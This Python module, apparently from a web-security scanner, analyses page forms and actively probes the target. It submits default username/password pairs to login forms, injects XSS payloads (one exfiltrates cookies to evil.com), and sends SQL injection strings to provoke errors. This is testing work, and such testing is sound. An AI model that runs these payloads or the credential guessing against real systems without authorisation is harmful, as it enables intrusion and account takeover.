import base64
import re
import requests
from urllib.parse import urljoin, urlparse, parse_qs

from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

try:
    import bs4
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

CSRF_INDICATORS = re.compile(r"csrf|_token|_csrf|csrf_token|csrfmiddlewaretoken|authenticity_token|token|nonce|xsrf|xsrf-token|__RequestVerificationToken|form_token|security_token|_csrf_token|csrf-name|csrfvalue", re.I)

AUTOCOMPLETE_SENSITIVE = re.compile(r"(credit_card|cc_number|cvv|cvc|ssn|social_security|password|pin|bank_account|routing_number)", re.I)

DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "letmein"), ("admin", "root"),
    ("admin", "toor"), ("admin", "pass"), ("admin", "Passw0rd"),
    ("root", "root"), ("root", "admin"), ("root", "toor"),
    ("root", "password"), ("root", "123456"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("test", "test"), ("test", "123456"), ("guest", "guest"),
    ("admin", "admin1"), ("admin", "password1"), ("admin", "administrator"),
    ("administrator", "administrator"), ("administrator", "admin"),
    ("demo", "demo"), ("demo", "123456"),
]

SENSITIVE_FIELD_NAMES = [
    "password", "passwd", "pass", "pwd", "secret", "api_key", "apikey",
    "api-key", "api_secret", "apisecret", "token", "auth", "authorization",
    "bearer", "jwt", "access_key", "accesskey", "secret_key", "secretkey",
    "private_key", "privatekey", "ssh_key", "sshkey", "credit_card",
    "cc_number", "card_number", "cvv", "cvc", "ssn", "social_security",
    "pin", "bank_account", "routing_number",
]

XSS_TEST_PAYLOADS = [
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '\'"><svg onload=alert(1)>',
    '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
]

MISLEADING_PASSWORD_NAMES = [
    "email", "username", "login", "user", "name", "yourname",
    "firstname", "lastname", "fullname", "nick", "nickname",
    "phone", "mobile", "address", "city", "zip", "postal",
]

FORM_SECURITY_CHECKS = [
    "password_over_http", "missing_csrf", "autocomplete_enabled",
    "hidden_field_tampering", "oversized_maxlength", "insecure_action",
    "relative_action", "file_upload_no_enctype", "empty_action",
    "default_credentials_in_source", "sensitive_field_name",
    "api_key_in_form", "credit_card_field", "get_form_with_password",
    "password_field_naming_issues", "no_input_validation",
]


class AdvancedFormAnalyzer:
    name = "forms"
    description = "Advanced form security analyzer (CSRF, autocomplete, hidden fields, credentials leak, insecure actions, API key exposure)"

    @staticmethod
    def run(target, ollama_model=None):
        section(f"Advanced Form Security Analyzer: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        if not HAS_BS4:
            error("beautifulsoup4 not installed. Install with: pip install beautifulsoup4")
            return {"target": target, "error": "Missing beautifulsoup4"}

        try:
            resp = requests.get(target, timeout=15,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                allow_redirects=True)
            html = resp.text
            final_url = resp.url
        except Exception as e:
            error(f"Failed to fetch page: {e}")
            return {"target": target, "error": str(e)}

        soup = bs4.BeautifulSoup(html, "html.parser")
        forms = soup.find_all("form")
        scripts = soup.find_all("script")
        comments = soup.find_all(string=lambda text: isinstance(text, bs4.Comment))

        parsed_page = urlparse(final_url)
        page_scheme = parsed_page.scheme
        page_domain = parsed_page.netloc

        section("Phase 1: Page-Level Security Analysis")
        page_issues = []

        if page_scheme == "http":
            page_issues.append("Page served over HTTP (no encryption)")
            warning("Page is served over HTTP — credentials and data transmitted in plaintext")

        csrf_meta = soup.find("meta", attrs={"name": re.compile(r"csrf|token", re.I)})
        csrf_in_hidden = bool(soup.find("input", {"type": "hidden", "name": CSRF_INDICATORS}))
        if not csrf_meta and not csrf_in_hidden:
            page_issues.append("No CSRF protection detected (no meta CSRF tag and no hidden CSRF fields)")
            warning("No CSRF protection detected on this page")
        elif csrf_meta:
            info("CSRF meta tag found")
        elif csrf_in_hidden:
            info("CSRF protection via hidden input fields")

        has_sensitive_inputs = bool(soup.find("input", {"type": "password"}))
        if has_sensitive_inputs:
            info("Page contains password fields")

        for comment in comments:
            comment_text = str(comment).lower()
            for indicator in ["password", "admin", "secret", "key", "token", "username", "login", "api", "credentials", "db_", "database", "sql", "passwd"]:
                if indicator in comment_text:
                    warning(f"HTML comment may leak sensitive info: '{indicator}' in: {comment_text[:150]}...")
                    page_issues.append(f"Sensitive data in HTML comments ({indicator})")
                    break

        for script in scripts:
            script_text = str(script.string or "")
            for indicator in ["api_key", "apikey", "apiKey", "secret", "token: '", "password: '", "credentials", "authorization"]:
                if indicator in script_text.lower():
                    if len(script_text) < 500:
                        warning(f"Possible credential/API key in inline script: {script_text[:200]}")
                        page_issues.append(f"Hardcoded credentials in script ({indicator})")
                    break

        section("Phase 1.5: CORS Preflight Check for Form Targets")
        form_actions = set()
        for form in forms:
            action = form.get("action", "") or ""
            if action and action != "#":
                form_actions.add(urljoin(final_url, action))
        if form_actions:
            for action_url in form_actions:
                try:
                    opt_resp = requests.options(action_url, timeout=10,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                    cors_headers = {
                        "Access-Control-Allow-Origin": opt_resp.headers.get("Access-Control-Allow-Origin", ""),
                        "Access-Control-Allow-Methods": opt_resp.headers.get("Access-Control-Allow-Methods", ""),
                        "Access-Control-Allow-Credentials": opt_resp.headers.get("Access-Control-Allow-Credentials", ""),
                    }
                    if cors_headers["Access-Control-Allow-Origin"]:
                        if cors_headers["Access-Control-Allow-Origin"] == "*":
                            warning(f"CORS: {action_url} allows all origins (*)")
                            page_issues.append(f"CORS wildcard origin on form target: {action_url}")
                        elif cors_headers["Access-Control-Allow-Credentials"] == "true":
                            warning(f"CORS: {action_url} allows credentials with specific origin")
                            page_issues.append(f"CORS with credentials on form target: {action_url}")
                        if cors_headers["Access-Control-Allow-Methods"]:
                            info(f"CORS methods for {action_url}: {cors_headers['Access-Control-Allow-Methods']}")
                    if opt_resp.status == 200 and not cors_headers["Access-Control-Allow-Origin"]:
                        info(f"OPTIONS on {action_url} returned 200 but no CORS headers (no CORS configured)")
                except requests.RequestException:
                    pass
        else:
            info("No external form action URLs to check for CORS")

        if ollama and ollama.available and forms:
            section("Phase 0: Ollama Form Security Analysis")
            for i, form in enumerate(forms[:3], 1):
                form_html = str(form)
                ai_issues = ollama.analyze_form_security(form_html, final_url)
                if ai_issues:
                    info(f"Ollama identified issues for Form #{i}:")
                    for issue in ai_issues:
                        if issue and len(issue) > 5:
                            warning(f"  [Ollama] {issue}")

        section("Phase 2: Form Analysis")
        if not forms:
            warning("No forms found on this page")
            return {"target": target, "forms": [], "page_issues": page_issues}

        info(f"Found {len(forms)} form(s)")
        all_form_analyses = []
        all_issues = []

        for i, form in enumerate(forms, 1):
            section(f"Form #{i}")
            form_analysis = AdvancedFormAnalyzer.analyze_form(form, final_url)
            all_form_analyses.append(form_analysis)

            issues = form_analysis["issues"]
            all_issues.extend(issues)

            result("ID/Name", form_analysis.get("id", "unnamed"))
            result("Method", form_analysis["method"])
            result("Action", form_analysis["action_url"])

            if form_analysis.get("cms_identified"):
                result("CMS", form_analysis["cms_identified"])

            fields = form_analysis["fields"]
            result("Fields", str(len(fields)))
            result("Password Fields", str(form_analysis["password_count"]))
            result("File Upload", "Yes" if form_analysis["has_file_upload"] else "No")
            result("Has CSRF", "No" if form_analysis.get("missing_csrf") else "Yes")

            if form_analysis.get("autocomplete_on_password"):
                warning("  PASSWORD AUTOCOMPLETE ENABLED")

            hidden = form_analysis.get("hidden_fields", [])
            if hidden:
                section(f"  Hidden Field(s)")
                for name, val in hidden:
                    display = val[:60] if val else "(empty)"
                    result(f"  {name}", display)

                    if val and len(val) > 20 and re.match(r'^[A-Za-z0-9+/=]{20,}$', val):
                        warning(f"    Possible Base64-encoded data in hidden field '{name}'")
                        try:
                            decoded = base64.b64decode(val).decode("utf-8", errors="ignore")
                            if any(k in decoded.lower() for k in ["user", "pass", "token", "admin", "id"]):
                                warning(f"    Decoded hidden '{name}' contains credentials: {decoded[:80]}")
                        except:
                            pass

                    if val and val.isdigit() and len(val) < 10:
                        info(f"    Hidden numeric field (possible price/ID tampering): {name}={val}")

                    if re.match(r'^[a-f0-9]{32}$', val.lower()):
                        warning(f"    Hidden field '{name}' contains MD5 hash: {val}")
                    if re.match(r'^[a-f0-9]{40}$', val.lower()):
                        warning(f"    Hidden field '{name}' contains SHA1 hash: {val}")

            for f in fields:
                fname = f.get("name", "").lower()
                ftype = f.get("type", "").lower()
                fvalue = f.get("value", "")

                if ftype == "hidden":
                    for sensitive in ["api", "key", "secret", "token"]:
                        if sensitive in fname and fvalue:
                            warning(f"    API credential in hidden field: {f['name']}={fvalue[:40]}")

            if form_analysis.get("default_creds_found"):
                for cred in form_analysis["default_creds_found"]:
                    warning(f"  DEFAULT CREDENTIALS in source: {cred[0]}/{cred[1]}")

            if form_analysis.get("csrf_field_names"):
                result("CSRF Fields", ", ".join(form_analysis["csrf_field_names"]))

            if form_analysis.get("sensitive_field_names"):
                warning(f"  Sensitive field names exposed: {form_analysis['sensitive_field_names']}")

            if issues:
                section(f"  Security Issues ({len(issues)})")
                for issue in issues:
                    if any(kw in issue.lower() for kw in ["critical", "password leak", "api key", "credentials"]):
                        error(f"  {issue}")
                    else:
                        warning(f"  {issue}")

        section("Phase 3: Testing Default Credentials via Form Submission")
        login_forms = [f for f in all_form_analyses if f["password_count"] > 0]
        if login_forms:
            for lf in login_forms[:2]:
                action_url = lf["action_url"]
                method = lf["method"]
                username_fields = [f["name"] for f in lf["fields"] if f["type"] in ("text", "email") and f["name"]]
                password_fields = [f["name"] for f in lf["fields"] if f["type"] == "password" and f["name"]]
                if username_fields and password_fields:
                    info(f"Testing {len(DEFAULT_CREDENTIALS)} default credentials against {action_url}...")
                    for username, password in DEFAULT_CREDENTIALS[:5]:
                        try:
                            form_data = {}
                            for uf in username_fields:
                                form_data[uf] = username
                            for pf in password_fields:
                                form_data[pf] = password
                            if method == "post":
                                login_resp = requests.post(action_url, data=form_data, timeout=10,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                    allow_redirects=False)
                            else:
                                login_resp = requests.get(action_url, params=form_data, timeout=10,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                    allow_redirects=False)

                            if login_resp.status_code not in (401, 403) and login_resp.status_code < 500:
                                if "invalid" not in login_resp.text[:500].lower() and "incorrect" not in login_resp.text[:500].lower():
                                    if len(login_resp.text) > 500:
                                        info(f"  [{username}/{password}] -> {login_resp.status_code} (may be valid)")
                        except:
                            pass

        section("Phase 4: XSS in Form Fields Detection")
        xss_findings = []
        for form in forms[:3]:
            inputs = form.find_all(["input", "textarea"])
            text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "search", "url", "email", "textarea")]
            if text_inputs:
                for payload in XSS_TEST_PAYLOADS[:2]:
                    test_form_data = {}
                    for inp in text_inputs:
                        inp_name = inp.get("name", "")
                        if inp_name:
                            test_form_data[inp_name] = payload
                    action = form.get("action", "") or ""
                    action_url = urljoin(final_url, action) if action else final_url
                    method = form.get("method", "get").upper()
                    try:
                        if method == "POST":
                            xss_resp = requests.post(action_url, data=test_form_data, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                        else:
                            xss_resp = requests.get(action_url, params=test_form_data, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                        if payload in xss_resp.text:
                            reflected = xss_resp.text.index(payload)
                            context = xss_resp.text[max(0, reflected-60):reflected+len(payload)+60]
                            xss_findings.append(f"XSS payload '{payload[:30]}...' reflected in response from {action_url}")
                            warning(f"XSS payload reflected in {action_url}: {context[:120]}")
                            all_issues.append(f"XSS vulnerability: payload '{payload[:30]}...' reflected in form action {action_url}")
                            break
                    except requests.RequestException:
                        pass
        if not xss_findings:
            success("No reflected XSS detected in form submissions")

        section("Phase 5: Error Message Information Disclosure Analysis")
        error_indicators_found = []
        error_keywords = [
            "sql", "mysql", "postgresql", "ora-", "driver", "db2_",
            "warning:", "fatal error", "stack trace", "traceback",
            "unexpected token", "syntax error", "division by zero",
            "undefined index", "undefined variable", "invalid argument",
            "file_get_contents", "include_path", "call to undefined",
            "exception", "debug", "backtrace", "in /var/www", "in /home/",
            "on line", "at line",
        ]
        for form in forms[:3]:
            inputs = form.find_all(["input", "textarea"])
            text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "search", "url", "email", "textarea")]
            if text_inputs:
                error_test_values = [
                    {"type": "sql_injection", "value": "' OR '1'='1"},
                    {"type": "sql_injection_2", "value": "1' UNION SELECT * FROM users--"},
                    {"type": "long_string", "value": "A" * 5000},
                    {"type": "special_chars", "value": "<>%'\"&\\/?<>"},
                    {"type": "empty", "value": ""},
                    {"type": "null_byte", "value": "test%00test"},
                    {"type": "json_injection", "value": '{"test": "value"}'},
                ]
                for test_case in error_test_values:
                    test_form_data = {}
                    for inp in text_inputs:
                        inp_name = inp.get("name", "")
                        if inp_name:
                            test_form_data[inp_name] = test_case["value"]
                    action = form.get("action", "") or ""
                    action_url = urljoin(final_url, action) if action else final_url
                    method = form.get("method", "get").upper()
                    try:
                        if method == "POST":
                            err_resp = requests.post(action_url, data=test_form_data, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                        else:
                            err_resp = requests.get(action_url, params=test_form_data, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                        resp_text = err_resp.text.lower()
                        for keyword in error_keywords:
                            if keyword in resp_text:
                                snippet = err_resp.text[resp_text.index(keyword)-30:resp_text.index(keyword)+len(keyword)+80]
                                finding = f"Information disclosure via '{test_case['type']}' -> '{keyword}' in response: {snippet[:150]}"
                                if finding not in error_indicators_found:
                                    error_indicators_found.append(finding)
                                    warning(f"Error info disclosure: {finding[:120]}")
                                    all_issues.append(f"Information disclosure: error message '{keyword}' leaked via {test_case['type']}")
                                break
                    except requests.RequestException:
                        pass
        if not error_indicators_found:
            success("No error message information disclosure detected")

        all_issues = list(set(all_issues))
        section("Security Analysis Summary")
        if all_issues:
            error(f"Total security issues: {len(all_issues)}")
            critical = [i for i in all_issues if any(kw in i.lower() for kw in ["password leak", "api key", "critical", "credentials", "token", "autocomplete"])]
            if critical:
                section(f"Critical Issues ({len(critical)})")
                for c in critical:
                    error(f"  {c}")
            for issue in all_issues:
                if issue not in critical:
                    warning(f"  {issue}")

            risk_score = min(len(all_issues) * 10 + len(critical) * 25, 100)
            result("Risk Score", f"{risk_score}/100")
        else:
            success("No immediate security issues detected")

        return {"target": target, "forms": len(forms), "form_analyses": all_form_analyses, "page_issues": page_issues}

    @staticmethod
    def analyze_form(form, page_url):
        issues = []
        findings = {}

        action = form.get("action", "") or ""
        method = form.get("method", "get").upper()
        form_id = form.get("id", form.get("name", "unnamed"))
        form_class = form.get("class", "")

        findings["id"] = form_id
        findings["method"] = method
        findings["action"] = action

        action_url = urljoin(page_url, action) if action else page_url
        findings["action_url"] = action_url

        inputs = form.find_all(["input", "textarea", "select"])
        findings["fields"] = []
        password_fields = []
        text_fields = []
        email_fields = []
        hidden_fields = []
        file_fields = []
        csrf_fields = []
        findings["sensitive_field_names"] = []
        findings["csrf_field_names"] = []

        for inp in inputs:
            inp_type = inp.get("type", "text").lower()
            inp_name = inp.get("name", inp.get("id", ""))
            inp_value = inp.get("value", "")
            inp_autocomplete = inp.get("autocomplete", "")
            inp_maxlength = inp.get("maxlength", "")

            field_info = {
                "name": inp_name,
                "type": inp_type,
                "value": inp_value[:60] if inp_value else "",
            }
            findings["fields"].append(field_info)

            if inp_type == "password":
                password_fields.append(inp_name)
                if inp_autocomplete != "off":
                    findings["autocomplete_on_password"] = True
                    issues.append("Password field with autocomplete enabled (browser may save passwords)")
                if inp_name and inp_name.lower() not in ("password", "passwd", "pwd", "pass", "user_pass"):
                    findings.setdefault("unusual_password_field_names", []).append(inp_name)
                if inp_name and inp_name.lower() in MISLEADING_PASSWORD_NAMES:
                    issues.append(f"Misleading password field name: '{inp_name}' is type password but named like a non-password field")

                if inp_maxlength:
                    findings["password_maxlength"] = inp_maxlength

            if inp_type in ("text", "email"):
                text_fields.append(inp_name)
                if inp_name.lower() in SENSITIVE_FIELD_NAMES:
                    findings["sensitive_field_names"].append(inp_name)

            if inp_type == "hidden":
                hidden_fields.append((inp_name, inp_value))
                if CSRF_INDICATORS.search(inp_name):
                    csrf_fields.append(inp_name)

            if inp_type == "file":
                file_fields.append(inp_name)

            if inp_maxlength:
                try:
                    if int(inp_maxlength) > 2000:
                        issues.append(f"Oversized maxlength ({inp_maxlength}) on '{inp_name}' — possible buffer overflow")
                except:
                    pass

        findings["password_count"] = len(password_fields)
        findings["text_count"] = len(text_fields)
        findings["hidden_fields"] = hidden_fields
        findings["csrf_field_names"] = csrf_fields
        findings["has_file_upload"] = len(file_fields) > 0
        findings["missing_csrf"] = (method == "POST" and not csrf_fields and len(password_fields) == 0 and len(text_fields) > 0)

        action_parsed = urlparse(action_url)
        page_parsed = urlparse(page_url)

        if method == "GET" and password_fields:
            issues.append("CRITICAL: GET form with password fields — credentials exposed in URL/browser history/logs")
            findings["password_over_http"] = True

        if password_fields and action_parsed.scheme != "https":
            issues.append("CRITICAL: Password form submits over non-HTTPS connection — credentials leaked in transit")

        if not action or action == "#":
            issues.append("Form submits to empty/hash action (may be vulnerable to open redirect via action injection)")
        elif action_parsed.scheme == "http" and page_parsed.scheme == "https":
            issues.append("Form action uses HTTP from HTTPS page (mixed content — MITM attack possible)")

        if action and not action.startswith("http") and not action.startswith("/") and not action.startswith("?"):
            issues.append("Relative form action URL — possible open redirection vector")

        if file_fields:
            enc = form.get("enctype", "")
            if enc != "multipart/form-data":
                issues.append("File upload form without correct enctype='multipart/form-data'")

        target_form = form.get("action", "").lower()
        external_domains = ["evil.com", "attacker.com", "hacker.com", "phishing.com", "malicious.com"]
        for ext_domain in external_domains:
            if ext_domain in target_form:
                issues.append(f"Form submits to potentially malicious domain: {target_form}")

        if hidden_fields:
            for name, val in hidden_fields:
                if val and val.isdigit() and len(val) < 10:
                    issues.append(f"Hidden numeric field '{name}={val}' — possible price/role/ID tampering")
                if val and len(val) > 50 and re.match(r'^[A-Za-z0-9+/=]{20,}$', val):
                    issues.append(f"Hidden field '{name}' appears to be Base64 — may contain sensitive data")
                if re.match(r'^[a-f0-9]{32}$', val.lower()) or re.match(r'^[a-f0-9]{40}$', val.lower()):
                    issues.append(f"Hidden field '{name}' contains hash value — may leak session/user data")

        if csrf_fields:
            for cf in csrf_fields:
                for field in form.find_all("input", attrs={"name": cf}):
                    token_val = field.get("value", "")
                    if token_val and len(token_val) < 8:
                        issues.append(f"CSRF token '{cf}' appears short/weak: {token_val}")

        findings["default_creds_found"] = []
        page_text = str(form).lower()
        for user, pwd in DEFAULT_CREDENTIALS:
            if user in page_text and pwd in page_text:
                pattern = f"{user}.*?{pwd}"
                if re.search(pattern, page_text, re.DOTALL):
                    issues.append(f"Default credentials detected in form: {user}/{pwd}")
                    findings["default_creds_found"].append((user, pwd))

        findings["issues"] = issues
        return findings
